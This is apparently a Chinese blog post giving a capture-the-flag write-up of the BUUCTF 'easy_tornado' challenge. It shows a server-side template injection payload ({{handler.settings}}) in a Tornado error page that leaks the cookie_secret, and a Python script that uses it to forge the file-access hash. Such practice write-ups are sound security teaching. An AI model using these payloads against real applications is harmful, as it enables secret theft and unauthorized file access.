---
title: BUU-eazy_tornado
date: 2021-10-30 16:03:45
updated: 2021-10-30 16:03:45
tags: [SSTI]
categories: BUUCTF
toc: true
---
一道题的解题记录
<!-- more -->

打开题目发现三个文件，点开查看并观察URL

![](https://i.loli.net/2021/10/30/l6HpMQYB2SCx9wy.png)

![](https://i.loli.net/2021/10/30/flhtrHZbuFmMgpc.png)

![](https://i.loli.net/2021/10/30/JCk4lb63PQSrDTA.png)

![](https://i.loli.net/2021/10/30/BaJhHlbWuFYf3qS.png)

了解到访问一个文件需要知道它的特殊hash值

### **知识点：**

 `render()`，这个是生成模板的函数，于是想到模板注入STTI。

尝试访问`/fllllllllllllag`,出现报错页面，很有可能就是注入点

![](https://i.loli.net/2021/10/30/1QI7qOBpyM56wZi.png)

![](https://i.loli.net/2021/10/30/b21k5eVaDqlXgNE.png)

用了几次基本的注入模板，发现总是出现ORZ，应该是被过滤了一些特殊字符

> 在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象，具体定义可以[参考Tornado官方文档](http://tornado.readthedocs.org/en/latest/guide/templates.html#template-syntax)！

![image-20211030161106297](https://i.loli.net/2021/10/30/1AkTlqnGQjbXgJ6.png)

网上搜索了解到，可以使用`{{handler.settings}}` 获取当前页面的一些请求信息

handler 指向RequestHandler

而RequestHandler.settings又指向self.application.settings。

所以构造payload:

```bash
error?msg={{handler.settings}}
```

![](https://i.loli.net/2021/10/30/JMAUYotPcryFBdv.png)

拿到cookie_secret，用python写脚本构造filehash

```python
import hashlib

cookie = '1ccd7a19-fe54-4ce1-a950-d70dc6e701a0'
filename = '/fllllllllllllag'

def md5(code):
    m = hashlib.md5() #创建md5对象
    m.update(code.encode('utf-8')) #更新md5要加密的值，主要要encode
    return m.hexdigest()

res = md5(cookie+md5(filename))
print(res)
```

![image-20211030163223338](https://i.loli.net/2021/10/30/NulfhPBsi4HRZkn.png)

